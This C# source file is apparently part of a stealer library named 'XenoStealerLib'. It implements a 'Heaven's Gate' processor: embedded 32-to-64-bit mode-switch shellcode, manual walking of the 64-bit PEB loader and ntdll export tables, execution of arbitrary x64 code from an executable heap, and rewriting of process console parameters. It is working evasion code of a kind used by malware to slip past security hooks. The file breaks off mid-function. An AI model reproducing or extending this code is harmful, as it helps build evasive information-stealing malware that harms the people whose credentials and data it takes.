using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Text;
using System.Threading.Tasks;

namespace XenoStealerLib.Utils
{
    public class HeavensGateProcessor
    {
        
        private ulong LdrLoadDll;
        private ulong LdrGetDllHandle;
        private ulong LdrGetProcedureAddress;
        private IntPtr Wow64ExecutableHeap;

        public ulong ntdll64;
        public ulong kernel32;


        public HeavensGateProcessor() 
        {
            bool worked=InternalGetModuleHandle64(ref ntdll64, "ntdll.dll");
            if (!worked) 
            {
                throw new Exception("Error starting up heavens gate");
            }
            worked = InternalGetProcAddress64(ref LdrLoadDll, ntdll64, "LdrLoadDll");
            if (!worked)
            {
                throw new Exception("Error starting up heavens gate");
            }
            worked = InternalGetProcAddress64(ref LdrGetDllHandle, ntdll64, "LdrGetDllHandle");
            if (!worked)
            {
                throw new Exception("Error starting up heavens gate");
            }
            worked = InternalGetProcAddress64(ref LdrGetProcedureAddress, ntdll64, "LdrGetProcedureAddress");
            if (!worked)
            {
                throw new Exception("Error starting up heavens gate");
            }

            uint HEAP_CREATE_ENABLE_EXECUTE = 0x00040000;
            uint HEAP_GROWABLE = 0x00000002;
            Wow64ExecutableHeap = SpecialNativeMethods.RtlCreateHeap(HEAP_CREATE_ENABLE_EXECUTE | HEAP_GROWABLE,
                IntPtr.Zero,
                0,
                0,
                IntPtr.Zero,
                IntPtr.Zero);
            if (Wow64ExecutableHeap==IntPtr.Zero)
            {
                throw new Exception("Error starting up heavens gate");
            }
        }



        private delegate ulong Wow64Execution(IntPtr func, IntPtr parameters);

        private byte[] Wow64ExecuteShellCode= {
	        //BITS32
	        0x55,										//push ebp
	        0x89, 0xe5,									//mov ebp, esp
	        0x56,										//push esi
	        0x57,										//push edi
	        0x8b, 0x75, 0x08,							//mov esi, dword ptr ss:[ebp + 0x8]
	        0x8b, 0x4d, 0x0c,							//mov ecx, dword ptr ss:[ebp + 0xC]
	        0xe8, 0x00, 0x00, 0x00, 0x00,				//call $0
	        0x58,										//pop eax
	        0x83, 0xc0, 0x2a,							//add eax, 0x2A
	        0x83, 0xec, 0x08,							//sub esp, 0x8
	        0x89, 0xe2,									//mov edx, esp
	        0xc7, 0x42, 0x04, 0x33, 0x00, 0x00, 0x00,	//mov dword ptr ds:[edx + 0x4], 0x33
	        0x89, 0x02,									//mov dword ptr ds:[edx], eax
	        0xe8, 0x0e, 0x00, 0x00, 0x00,				//call SwitchTo64
	        0x66, 0x8c, 0xd9,							//mov cx, ds
	        0x8e, 0xd1,									//mov ss, cx
	        0x83, 0xc4, 0x14,							//add esp, 0x14
	        0x5f,										//pop edi
	        0x5e,										//pop esi
	        0x5d,										//pop ebp
	        0xc2, 0x08, 0x00,							//ret 0x8

	        //SwitchTo64:
	        0x8b, 0x3c, 0x24,							//mov edi, dword ptr ss:[esp]
	        0xff, 0x2a,									//jmp far fword ptr ds:[edx]


	        //BITS64
	        0x48, 0x31, 0xc0,							//xor rax, rax
	        0x57,										//push rdi
	        0xff, 0xd6,									//call rsi
	        0x5f,										//pop rdi
	        0x50,										//push rax
	        0xc7, 0x44, 0x24, 0x04, 0x23, 0x00, 0x00, 0x00,//mov dword ptr ss:[rsp + 0x4], 0x23
	        0x89, 0x3c, 0x24,							//mov dword ptr ss:[rsp], edi
	        0x48, 0x89, 0xC2,							//mov rdx, rax
	        0x21, 0xC0,									//and eax, eax
	        0x48, 0xC1, 0xEA, 0x20,						//shr rdx, 0x20 
	        0xff, 0x2c, 0x24,							//jmp far fword ptr ss:[rsp]
        };


        private bool NT_SUCCESS(int statusCode) 
        {
            return statusCode!=int.MaxValue || statusCode >= 0;
        }

        private bool CopyMemory(IntPtr dest, IntPtr src, uint len) 
        {
            try
            {
                return NT_SUCCESS(NativeMethods.memcpy(dest, src, len));
            }
            catch 
            {
                
            }
            return false;
        }

        private static IntPtr CopyULongArrayToUnmanagedMemory(ulong[] ulongArray)
        {
            int byteLength = ulongArray.Length * sizeof(ulong);
            IntPtr unmanagedMemory = Marshal.AllocHGlobal(byteLength);
            byte[] byteArray = new byte[byteLength];
            Buffer.BlockCopy(ulongArray.SelectMany(BitConverter.GetBytes).ToArray(), 0, byteArray, 0, byteLength);
            Marshal.Copy(byteArray, 0, unmanagedMemory, byteLength);
            return unmanagedMemory;
        }

        private bool InternalGetModuleHandle64(ref ulong ModuleHandle, string ModuleName) 
        {
            bool status = true;
            IntPtr hProcess = NativeMethods.GetCurrentProcess();
            
            ModuleHandle = 0;

            if (!NativeMethods.DuplicateHandle(hProcess, hProcess, hProcess, ref hProcess, 0, false, 2)) 
            {
                NativeMethods.CloseHandle(hProcess);
                return false;
            }

            PROCESS_BASIC_INFORMATION64 pbi64 = new PROCESS_BASIC_INFORMATION64();

            ulong BytesRead = 0;

            int QueryStatus=SpecialNativeMethods.NtWow64QueryInformationProcess64(hProcess, PROCESSINFOCLASS.ProcessBasicInformation, ref pbi64,
                Marshal.SizeOf(pbi64), ref BytesRead);

            if (!NT_SUCCESS(QueryStatus)) 
            {
                NativeMethods.CloseHandle(hProcess);
                return false;
            }

            ulong pLdr64 = 0;
            PEB_LDR_DATA64 ldr64 = new PEB_LDR_DATA64();
            ulong len = 0;


            IntPtr pLdrData = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(UlongResult)));
            ulong ldrAddr = publicMethods.GetLdr64(pbi64.PebBaseAddress);

            int ReadVirtualMemoryStatus = SpecialNativeMethods.NtWow64ReadVirtualMemory64(hProcess, ldrAddr, pLdrData, (ulong)Marshal.SizeOf(typeof(ulong)), ref len);

            if (len != (ulong)Marshal.SizeOf(typeof(UlongResult)) || !NT_SUCCESS(ReadVirtualMemoryStatus))
            {
                Marshal.FreeHGlobal(pLdrData);
                NativeMethods.CloseHandle(hProcess);
                return false;
            }

            UlongResult UlongResultData = Marshal.PtrToStructure<UlongResult>(pLdrData);
            Marshal.FreeHGlobal(pLdrData);
            pLdr64 = UlongResultData.Value;

            IntPtr ldr64addr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(PEB_LDR_DATA64)));

            Marshal.StructureToPtr(ldr64, ldr64addr, false);

            ReadVirtualMemoryStatus= SpecialNativeMethods.NtWow64ReadVirtualMemory64(
                hProcess,
                pLdr64,
                ldr64addr,
                (ulong)Marshal.SizeOf(ldr64),
                ref len
            );

            if (len != (ulong)Marshal.SizeOf(typeof(PEB_LDR_DATA64)) || !NT_SUCCESS(ReadVirtualMemoryStatus))
            {
                Marshal.FreeHGlobal(ldr64addr);
                NativeMethods.CloseHandle(hProcess);
                return false;
            }

            ldr64 = Marshal.PtrToStructure<PEB_LDR_DATA64>(ldr64addr);
            Marshal.FreeHGlobal(ldr64addr);
            ulong entry = ldr64.InLoadOrderModuleList.Flink;
            ulong head = ldrAddr + (ulong)Marshal.OffsetOf(typeof(PEB_LDR_DATA64), "InLoadOrderModuleList");

            LDR_DATA_TABLE_ENTRY64_SNAP data = new LDR_DATA_TABLE_ENTRY64_SNAP();

            string currentModuleNameBuffer = null;

            uint bufferLength = 0;

            while (entry != head) 
            {
                int dataSize = Marshal.SizeOf(typeof(LDR_DATA_TABLE_ENTRY64_SNAP));
                IntPtr dataAddr = Marshal.AllocHGlobal(dataSize);

                Marshal.StructureToPtr(data, dataAddr, false);

                ReadVirtualMemoryStatus = SpecialNativeMethods.NtWow64ReadVirtualMemory64(
                    hProcess,
                    entry,
                    dataAddr,
                    (ulong)dataSize,
                    ref len
                );
                if (len != (ulong)Marshal.SizeOf(typeof(LDR_DATA_TABLE_ENTRY64_SNAP)) || !NT_SUCCESS(ReadVirtualMemoryStatus))
                {
                    Marshal.FreeHGlobal(dataAddr);
                    status = false;
                    break;
                }

                data = Marshal.PtrToStructure<LDR_DATA_TABLE_ENTRY64_SNAP>(dataAddr);
                Marshal.FreeHGlobal(dataAddr);
                if (data.BaseDllName.Length > bufferLength) 
                {
                    bufferLength = data.BaseDllName.Length; 
                }
                IntPtr currentModuleNameBufferAddr = Marshal.AllocHGlobal(data.BaseDllName.Length);

                ReadVirtualMemoryStatus = SpecialNativeMethods.NtWow64ReadVirtualMemory64(
                    hProcess,
                    data.BaseDllName.Buffer,
                    currentModuleNameBufferAddr,
                    data.BaseDllName.Length,
                    ref len
                );
                if ((len != data.BaseDllName.Length) || !NT_SUCCESS(ReadVirtualMemoryStatus))
                {
                    Marshal.FreeHGlobal(currentModuleNameBufferAddr);
                    status = false;
                    break;
                }
                currentModuleNameBuffer = Marshal.PtrToStringUni(currentModuleNameBufferAddr, data.BaseDllName.Length/ 2);
                Marshal.FreeHGlobal(currentModuleNameBufferAddr);
                if (currentModuleNameBuffer == ModuleName) 
                {
                    ModuleHandle = data.DllBase;
                }
                entry = data.InLoadOrderLinks.Flink;
            }

            status = ModuleHandle != 0;
            NativeMethods.CloseHandle(hProcess);
            return status;
        }
        private bool InternalGetProcAddress64(ref ulong FunctionAddress, ulong ModuleHandle, string FunctionName)
        {
            bool status = true;
            IntPtr hProcess = NativeMethods.GetCurrentProcess();

            FunctionAddress = 0;

            if (!NativeMethods.DuplicateHandle(hProcess, hProcess, hProcess, ref hProcess, 0, false, 2))
            {
                NativeMethods.CloseHandle(hProcess);
                return false;
            }

            IMAGE_DOS_HEADER dosHeader = new IMAGE_DOS_HEADER();
            IMAGE_NT_HEADERS64 ntHeader = new IMAGE_NT_HEADERS64();

            ulong len = 0;


            IntPtr dosHeaderaddr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(IMAGE_DOS_HEADER)));

            Marshal.StructureToPtr(dosHeader, dosHeaderaddr, false);

            int ReadVirtualMemoryStatus = SpecialNativeMethods.NtWow64ReadVirtualMemory64(
                hProcess,
                ModuleHandle,
                dosHeaderaddr,
                (ulong)Marshal.SizeOf(typeof(IMAGE_DOS_HEADER)),
                ref len
            );

            if (len != (ulong)Marshal.SizeOf(typeof(IMAGE_DOS_HEADER)) || !NT_SUCCESS(ReadVirtualMemoryStatus))
            {
                Marshal.FreeHGlobal(dosHeaderaddr);
                NativeMethods.CloseHandle(hProcess);
                return false;
            }

            dosHeader = Marshal.PtrToStructure<IMAGE_DOS_HEADER>(dosHeaderaddr);
            Marshal.FreeHGlobal(dosHeaderaddr);

            IntPtr ntHeaderaddr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(IMAGE_NT_HEADERS64)));

            Marshal.StructureToPtr(ntHeader, ntHeaderaddr, false);

            ReadVirtualMemoryStatus = SpecialNativeMethods.NtWow64ReadVirtualMemory64(
                hProcess,
                ModuleHandle + (ulong)dosHeader.e_lfanew,
                ntHeaderaddr,
                (ulong)Marshal.SizeOf(typeof(IMAGE_NT_HEADERS64)),
                ref len
            );

            if (len != (ulong)Marshal.SizeOf(typeof(IMAGE_NT_HEADERS64)) || !NT_SUCCESS(ReadVirtualMemoryStatus))
            {
                Marshal.FreeHGlobal(ntHeaderaddr);
                NativeMethods.CloseHandle(hProcess);
                return false;
            }

            ntHeader = Marshal.PtrToStructure<IMAGE_NT_HEADERS64>(ntHeaderaddr);
            Marshal.FreeHGlobal(ntHeaderaddr);

            IMAGE_EXPORT_DIRECTORY exportDir = new IMAGE_EXPORT_DIRECTORY();

            IntPtr exportDiraddr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(IMAGE_EXPORT_DIRECTORY)));

            Marshal.StructureToPtr(exportDir, exportDiraddr, false);

            int IMAGE_DIRECTORY_ENTRY_EXPORT = 0;

            IMAGE_DATA_DIRECTORY dataTable = ntHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

            if (dataTable.Size == 0 || dataTable.VirtualAddress == 0)
            {
                status = false;
            }
            else
            {
                ReadVirtualMemoryStatus = SpecialNativeMethods.NtWow64ReadVirtualMemory64(
                    hProcess,
                    ModuleHandle + dataTable.VirtualAddress,
                    exportDiraddr,
                    (ulong)Marshal.SizeOf(typeof(IMAGE_EXPORT_DIRECTORY)),
                    ref len
                );

                if (len != (ulong)Marshal.SizeOf(typeof(IMAGE_EXPORT_DIRECTORY)) || !NT_SUCCESS(ReadVirtualMemoryStatus))
                {
                    Marshal.FreeHGlobal(exportDiraddr);
                    NativeMethods.CloseHandle(hProcess);
                    status = false;
                }
                else
                {
                    exportDir = Marshal.PtrToStructure<IMAGE_EXPORT_DIRECTORY>(exportDiraddr);
                    Marshal.FreeHGlobal(exportDiraddr);
                }

            }

            if (!status)
            {
                NativeMethods.CloseHandle(hProcess);
                return status;
            }

            
            if (exportDir.NumberOfNames == 0)
            {
                NativeMethods.CloseHandle(hProcess);
                return false;
            }



            int rvaTableSize = (int)exportDir.NumberOfFunctions * Marshal.SizeOf(typeof(uint));
            int ordTableSize = (int)exportDir.NumberOfFunctions * Marshal.SizeOf(typeof(ushort));
            int nameTableSize = (int)exportDir.NumberOfNames * Marshal.SizeOf(typeof(uint));


            IntPtr rvaTableAddr = Marshal.AllocHGlobal(rvaTableSize);
            IntPtr ordTableAddr = Marshal.AllocHGlobal(ordTableSize);
            IntPtr nameTableAddr = Marshal.AllocHGlobal(nameTableSize);

            IntPtr[] tabs = new IntPtr[3] { rvaTableAddr, ordTableAddr, nameTableAddr };

            uint[] offsets = new uint[3] { exportDir.AddressOfFunctions, exportDir.AddressOfNameOrdinals, exportDir.AddressOfNames };

            int[] TableSizes = new int[3] { rvaTableSize, ordTableSize, nameTableSize };

            for (int i = 0; i < 3; i++) 
            {
                ReadVirtualMemoryStatus = SpecialNativeMethods.NtWow64ReadVirtualMemory64(
                    hProcess,
                    ModuleHandle + offsets[i],
                    tabs[i],
                    (ulong)TableSizes[i],
                    ref len
                );

                if (len != (ulong)TableSizes[i] || !NT_SUCCESS(ReadVirtualMemoryStatus))
                {
                    Marshal.FreeHGlobal(rvaTableAddr);
                    Marshal.FreeHGlobal(ordTableAddr);
                    Marshal.FreeHGlobal(nameTableAddr);
                    NativeMethods.CloseHandle(hProcess);
                    return false;
                }
            }

            int[] _rvaTable = new int[exportDir.NumberOfFunctions];
            short[] _ordTable = new short[exportDir.NumberOfFunctions];
            int[] _nameTable = new int[exportDir.NumberOfNames];

            Marshal.Copy(rvaTableAddr, _rvaTable, 0, _rvaTable.Length);
            Marshal.Copy(ordTableAddr, _ordTable, 0, _ordTable.Length);
            Marshal.Copy(nameTableAddr, _nameTable, 0, _nameTable.Length);

            uint[] rvaTable = new uint[_rvaTable.Length];
            ushort[] ordTable = new ushort[_ordTable.Length];
            uint[] nameTable = new uint[_nameTable.Length];

            for (int i = 0; i < rvaTable.Length; i++)
            {
                rvaTable[i] = unchecked((uint)_rvaTable[i]);
            }
            for (int i = 0; i < ordTable.Length; i++)
            {
                ordTable[i] = unchecked((ushort)_ordTable[i]);
            }
            for (int i = 0; i < nameTable.Length; i++)
            {
                nameTable[i] = unchecked((uint)_nameTable[i]);
            }
            Marshal.FreeHGlobal(rvaTableAddr);
            Marshal.FreeHGlobal(ordTableAddr);
            Marshal.FreeHGlobal(nameTableAddr);
            int bufferLen = FunctionName.Length + 1;
            IntPtr buffer = Marshal.AllocHGlobal(bufferLen);

            for (uint i = 0; i < exportDir.NumberOfNames; ++i)
            {
                ReadVirtualMemoryStatus = SpecialNativeMethods.NtWow64ReadVirtualMemory64(
                    hProcess,
                    ModuleHandle + nameTable[i],
                    buffer,
                    (ulong)bufferLen,
                    ref len
                );
                if (len != (ulong)bufferLen || !NT_SUCCESS(ReadVirtualMemoryStatus))
                {
                    Marshal.FreeHGlobal(buffer);
                    NativeMethods.CloseHandle(hProcess);
                    return false;
                }
                string RetrivedFuncName = Marshal.PtrToStringAnsi(buffer, bufferLen);
                if (!RetrivedFuncName.EndsWith("\0")) //ending with a null meaning that its the full string (null terminated)
                {
                    continue;
                }
                if (RetrivedFuncName == (FunctionName + "\0"))
                {
                    FunctionAddress = ModuleHandle + rvaTable[ordTable[i]];
                    break;
                }
            }
            Marshal.FreeHGlobal(buffer);
            NativeMethods.CloseHandle(hProcess);

            if (FunctionAddress == 0) 
            {
                status = false;
            }

            return status;
        }

        
        private ulong DispatchX64Call(byte[] code, ulong[] parameters) 
        {
            ulong result = ulong.MaxValue;
            if (code == null || code.Length == 0) 
            {
                return result;
            }

            uint HEAP_ZERO_MEMORY = 0x00000008;
            IntPtr pExecutableCode = SpecialNativeMethods.RtlAllocateHeap(Wow64ExecutableHeap, HEAP_ZERO_MEMORY, (uint)(Wow64ExecuteShellCode.Length + code.Length));
            if (pExecutableCode == IntPtr.Zero) 
            {
                return result;
            }
            IntPtr Wow64ExecuteAddr = Marshal.AllocHGlobal(Wow64ExecuteShellCode.Length);
            Marshal.Copy(Wow64ExecuteShellCode, 0, Wow64ExecuteAddr, Wow64ExecuteShellCode.Length);

            IntPtr CodeAddr = Marshal.AllocHGlobal(code.Length);
            Marshal.Copy(code, 0, CodeAddr, code.Length);

            CopyMemory(pExecutableCode, Wow64ExecuteAddr, (uint)Wow64ExecuteShellCode.Length);
            CopyMemory(pExecutableCode+ Wow64ExecuteShellCode.Length, CodeAddr, (uint)code.Length);

            Wow64Execution exec = Marshal.GetDelegateForFunctionPointer<Wow64Execution>(pExecutableCode);

            IntPtr paramPtr = IntPtr.Zero;
            if (parameters != null && parameters.Length > 0)
            {
                paramPtr = CopyULongArrayToUnmanagedMemory(parameters);
            }

            result = exec(pExecutableCode + Wow64ExecuteShellCode.Length, paramPtr);

            SpecialNativeMethods.RtlFreeHeap(Wow64ExecutableHeap, 0, pExecutableCode);

            if (paramPtr != IntPtr.Zero)
            {
                Marshal.FreeHGlobal(paramPtr);
            }
            Marshal.FreeHGlobal(CodeAddr);

            return result;
        }

        private bool CaptureConsoleHandles64(ref ulong ConsoleHandle, ref ulong StdIn, ref ulong StdOut, ref ulong StdError, ref uint WindowFlags, ref uint ConsoleFlags)
        {
            bool status = true;
            IntPtr hProcess = NativeMethods.GetCurrentProcess();
            ulong[] handles = new ulong[4];
            ulong[] handlesPtr = new ulong[] { ConsoleHandle, StdIn, StdOut, StdError };
            uint[] flags = new uint[2];
            uint[] flagsPtr = new uint[] { WindowFlags, ConsoleFlags };
            ulong len = 0;

            if (!NativeMethods.DuplicateHandle(hProcess, hProcess, hProcess, ref hProcess, 0, false, 2))
            {
                NativeMethods.CloseHandle(hProcess);
                return false;
            }

            PROCESS_BASIC_INFORMATION64 pbi64 = new PROCESS_BASIC_INFORMATION64();

            ulong BytesRead = 0;

            int QueryStatus = SpecialNativeMethods.NtWow64QueryInformationProcess64(hProcess, PROCESSINFOCLASS.ProcessBasicInformation, ref pbi64,
                Marshal.SizeOf(pbi64), ref BytesRead);

            if (!NT_SUCCESS(QueryStatus))
            {
                NativeMethods.CloseHandle(hProcess);
                return false;
            }

            ulong processParameters = publicMethods.GetProcessParameters64(pbi64.PebBaseAddress);

            
            int ReadVirtualMemoryStatus = 0;
            IntPtr tempProcessParametersBuffer = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(ulong)));
            if ((processParameters & ~0xffffffff)!=0)
            {
                
                ReadVirtualMemoryStatus = SpecialNativeMethods.NtWow64ReadVirtualMemory64(
                    hProcess,
                    processParameters,
                    tempProcessParametersBuffer,
                    (ulong)Marshal.SizeOf(typeof(ulong)),
                    ref len
                );
                if (len != (ulong)Marshal.SizeOf(typeof(ulong)) || !NT_SUCCESS(ReadVirtualMemoryStatus))
                {
                    Marshal.FreeHGlobal(tempProcessParametersBuffer);
                    NativeMethods.CloseHandle(hProcess);
                    return false;
                }

            }
            else
            {
                uint len32 = 0;

                int ReadMemoryStatus = NativeMethods.ReadProcessMemory(
                    hProcess,
                    (uint)processParameters,
                    tempProcessParametersBuffer,
                    (uint)Marshal.SizeOf(typeof(ulong)),
                    ref len32
                    );
                
                if (len32 != (ulong)Marshal.SizeOf(typeof(ulong)) || !NT_SUCCESS(ReadMemoryStatus))
                {
                    Marshal.FreeHGlobal(tempProcessParametersBuffer);
                    NativeMethods.CloseHandle(hProcess);
                    return false;
                }
            }
            processParameters = Marshal.PtrToStructure<UlongResult>(tempProcessParametersBuffer).Value;
            Marshal.FreeHGlobal(tempProcessParametersBuffer);

            RTL_USER_PROCESS_PARAMETERS64 upp = new RTL_USER_PROCESS_PARAMETERS64();
            IntPtr uppAddr = Marshal.AllocHGlobal(Marshal.SizeOf(upp));
            Marshal.StructureToPtr(upp, uppAddr, false);

            if ((processParameters & ~0xffffffff)!=0)
            {
                ReadVirtualMemoryStatus = SpecialNativeMethods.NtWow64ReadVirtualMemory64(
                    hProcess,
                    processParameters,
                    uppAddr,
                    (ulong)Marshal.SizeOf(upp),
                    ref len
                );
                if (len != (ulong)Marshal.SizeOf(upp) || !NT_SUCCESS(ReadVirtualMemoryStatus))
                {
                    Marshal.FreeHGlobal(uppAddr);
                    NativeMethods.CloseHandle(hProcess);
                    return false;
                }
            }
            else
            {
                uint len32 = 0;

                int ReadMemoryStatus = NativeMethods.ReadProcessMemory(
                    hProcess,
                    (uint)processParameters,
                    uppAddr,
                    (uint)Marshal.SizeOf(upp),
                    ref len32
                    );

                if (len32 != (ulong)Marshal.SizeOf(upp) || !NT_SUCCESS(ReadMemoryStatus))
                {
                    Marshal.FreeHGlobal(uppAddr);
                    NativeMethods.CloseHandle(hProcess);
                    return false;
                }
            }

            upp = Marshal.PtrToStructure<RTL_USER_PROCESS_PARAMETERS64>(uppAddr);
            Marshal.FreeHGlobal(uppAddr);

            handles[0] = upp.ConsoleHandle;
            handles[1] = upp.StandardInput;
            handles[2] = upp.StandardOutput;
            handles[3] = upp.StandardError;

            flags[0] = upp.WindowFlags;
            flags[1] = upp.ConsoleFlags;

            for (int i = 0; i < 4; ++i)
            {
                handlesPtr[i] = handles[i];
            }

            for (int i = 0; i < 2; ++i) 
            {
                flagsPtr[i] = flags[i];
            }
            NativeMethods.CloseHandle(hProcess);
            return status;

        }

        private bool WriteConsoleHandles64(ulong ConsoleHandle, ulong StdIn, ulong StdOut, ulong StdError, uint WindowFlags, uint ConsoleFlags)
        {
            bool status = true;
            IntPtr hProcess = NativeMethods.GetCurrentProcess();
            ulong len = 0;

            if (!NativeMethods.DuplicateHandle(hProcess, hProcess, hProcess, ref hProcess, 0, false, 2))
            {
                NativeMethods.CloseHandle(hProcess);
                return false;
            }

            PROCESS_BASIC_INFORMATION64 pbi64 = new PROCESS_BASIC_INFORMATION64();

            ulong BytesRead = 0;

            int QueryStatus = SpecialNativeMethods.NtWow64QueryInformationProcess64(hProcess, PROCESSINFOCLASS.ProcessBasicInformation, ref pbi64,
                Marshal.SizeOf(pbi64), ref BytesRead);

            if (!NT_SUCCESS(QueryStatus))
            {
                NativeMethods.CloseHandle(hProcess);
                return false;
            }

            ulong processParameters = publicMethods.GetProcessParameters64(pbi64.PebBaseAddress);


            int ReadVirtualMemoryStatus = 0;
            IntPtr tempProcessParametersBuffer = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(ulong)));
            if ((processParameters & ~0xffffffff) != 0)
            {

                ReadVirtualMemoryStatus = SpecialNativeMethods.NtWow64ReadVirtualMemory64(
                    hProcess,
                    processParameters,
                    tempProcessParametersBuffer,
                    (ulong)Marshal.SizeOf(typeof(ulong)),
                    ref len
                );
                if (len != (ulong)Marshal.SizeOf(typeof(ulong)) || !NT_SUCCESS(ReadVirtualMemoryStatus))
                {
                    Marshal.FreeHGlobal(tempProcessParametersBuffer);
                    NativeMethods.CloseHandle(hProcess);
                    return false;
                }

            }
            else
            {
                uint len32 = 0;

                int ReadMemoryStatus = NativeMethods.ReadProcessMemory(
                    hProcess,
                    (uint)processParameters,
                    tempProcessParametersBuffer,
                    (uint)Marshal.SizeOf(typeof(ulong)),
                    ref len32
                    );

                if (len32 != (ulong)Marshal.SizeOf(typeof(ulong)) || !NT_SUCCESS(ReadMemoryStatus))
                {
                    Marshal.FreeHGlobal(tempProcessParametersBuffer);
                    NativeMethods.CloseHandle(hProcess);
                    return false;
                }
            }
            processParameters = Marshal.PtrToStructure<UlongResult>(tempProcessParametersBuffer).Value;
            Marshal.FreeHGlobal(tempProcessParametersBuffer);
            if ((processParameters & ~0xffffffff) != 0)
            {
                RTL_USER_PROCESS_PARAMETERS64 p = new RTL_USER_PROCESS_PARAMETERS64();
                ulong totalLen = (ulong)Marshal.OffsetOf(typeof(RTL_USER_PROCESS_PARAMETERS64), "CurrentDirectory") - (ulong)Marshal.OffsetOf(typeof(RTL_USER_PROCESS_PARAMETERS64), "ConsoleHandle");

                p.ConsoleHandle = ConsoleHandle;
                p.ConsoleFlags = ConsoleFlags;
                p.StandardInput = StdIn;
                p.StandardOutput = StdOut;
                p.StandardError = StdError;
                p.WindowFlags = WindowFlags;

                IntPtr bufferPtr = Marshal.AllocHGlobal((int)totalLen);
                Marshal.StructureToPtr(p, bufferPtr, false);

                int writeResult = SpecialNativeMethods.NtWow64WriteVirtualMemory64(
                    hProcess,
                    processParameters + (ulong)Marshal.OffsetOf(typeof(RTL_USER_PROCESS_PARAMETERS64), "ConsoleHandle"),
                    new IntPtr((uint)bufferPtr + (uint)Marshal.OffsetOf(typeof(RTL_USER_PROCESS_PARAMETERS64), "ConsoleHandle")),
                    totalLen,
                    ref len
                );
                if (len != totalLen || !NT_SUCCESS(writeResult))
                {
                    Marshal.FreeHGlobal(bufferPtr);
                    NativeMethods.CloseHandle(hProcess);
                    return false;
                }

                writeResult = SpecialNativeMethods.NtWow64WriteVirtualMemory64(
                    hProcess,
                    processParameters + (ulong)Marshal.OffsetOf(typeof(RTL_USER_PROCESS_PARAMETERS64), "WindowFlags"),
                    new IntPtr((uint)bufferPtr + (uint)Marshal.OffsetOf(typeof(RTL_USER_PROCESS_PARAMETERS64), "WindowFlags")),
                    sizeof(uint),
                    ref len
                );
                Marshal.FreeHGlobal(bufferPtr);
                if (len != sizeof(uint) || !NT_SUCCESS(writeResult))
                {
                    NativeMethods.CloseHandle(hProcess);
                    return false;
                }
            }
            else
            {

                RTL_USER_PROCESS_PARAMETERS64 p = Marshal.PtrToStructure<RTL_USER_PROCESS_PARAMETERS64>(new IntPtr((int)processParameters));
                p.ConsoleHandle = ConsoleHandle;
                p.ConsoleFlags = ConsoleFlags;
                p.StandardInput = StdIn;
                p.StandardOutput = StdOut;
                p.StandardError = StdError;
                p.WindowFlags = WindowFlags;
                IntPtr pAddr = Marshal.AllocHGlobal(Marshal.SizeOf(p));
                Marshal.StructureToPtr(p, pAddr, false);
                uint writeLen = 0;
                int writeResult = NativeMethods.WriteProcessMemory(hProcess, (uint)processParameters, pAddr, (uint)Marshal.SizeOf(p), ref writeLen);
                Marshal.FreeHGlobal(pAddr);
                if (writeLen != Marshal.SizeOf(p) || !NT_SUCCESS(writeResult))
                {
                    NativeMethods.CloseHandle(hProcess);
                    return false;
                }
            }
            NativeMethods.CloseHandle(hProcess);
            return status;

        }


        public bool GetModuleHandle64(ref ulong ModuleHandle, string ModuleName)
        {
            UNICODE_STRING64 uniStr64 = new UNICODE_STRING64();
            SpecialNativeMethods.RtlCreateUnicodeString64FromAsciiz(ref uniStr64, ModuleName);

            IntPtr uniStr64Ptr = Marshal.AllocHGlobal(Marshal.SizeOf(uniStr64));

            Marshal.StructureToPtr(uniStr64, uniStr64Ptr, false);

            IntPtr modulePtr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(UlongResult)));


            ulong[] LdrGetDllHandleParams = new ulong[] { 0, 0, (ulong)uniStr64Ptr, (ulong)modulePtr };

            ulong result = Execute64(LdrGetDllHandle, LdrGetDllHandleParams);

            ModuleHandle = Marshal.PtrToStructure<UlongResult>(modulePtr).Value;

            Marshal.FreeHGlobal(uniStr64Ptr);
            Marshal.FreeHGlobal(modulePtr);
            return result == 0;
        }

        public ulong GetModuleHandle64(string ModuleName, out bool worked) 
        {
            ulong res = 0;
            worked = GetModuleHandle64(ref res, ModuleName);
            return res;
        }

        public ulong GetModuleHandle64(string ModuleName) 
        {
            return GetModuleHandle64(ModuleName, out bool _);
        }

        public bool GetProcAddress64(ref ulong FunctionAddress, ulong ModuleHandle, string FunctionName)
        {
            STRING64 str64 = new STRING64();
            SpecialNativeMethods.RtlInitAnsiString64(ref str64, FunctionName);
            IntPtr str64Ptr = Marshal.AllocHGlobal(Marshal.SizeOf(str64));

            Marshal.StructureToPtr(str64, str64Ptr, false);

            IntPtr FunctionAddressPtr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(UlongResult)));

            ulong[] LdrGetProcedureAddressParams = new ulong[] { ModuleHandle, (ulong)str64Ptr, 0, (ulong)FunctionAddressPtr };

            ulong result = Execute64(LdrGetProcedureAddress, LdrGetProcedureAddressParams);

            FunctionAddress = Marshal.PtrToStructure<UlongResult>(FunctionAddressPtr).Value;

            Marshal.FreeHGlobal(str64Ptr);
            Marshal.FreeHGlobal(FunctionAddressPtr);
            return result == 0;
        }

        public ulong GetProcAddress64(ulong ModuleHandle, string FunctionName, out bool worked) 
        {
            ulong res = 0;
            worked = GetProcAddress64(ref res, ModuleHandle, FunctionName);
            return res;
        }

        public ulong GetProcAddress64(ulong ModuleHandle, string FunctionName) 
        {
            return GetProcAddress64(ModuleHandle, FunctionName, out bool _);
        }

        public bool GetNativeProcAddress64(ref ulong FunctionAddress, string FunctionName)
        {
            return GetProcAddress64(ref FunctionAddress, ntdll64, FunctionName);
        }

        public ulong GetNativeProcAddress64(string FunctionName, out bool worked) 
        {
            ulong res = 0;
            worked = GetNativeProcAddress64(ref res, FunctionName);
            return res;
        }
        public ulong GetNativeProcAddress64(string FunctionName) 
        {
            return GetNativeProcAddress64(FunctionName, out bool _);
        }

        public bool LoadLibrary64(ref ulong ModuleHandle, string ModuleName)
        {
            UNICODE_STRING64 uniStr64 = new UNICODE_STRING64();
            SpecialNativeMethods.RtlCreateUnicodeString64FromAsciiz(ref uniStr64, ModuleName);

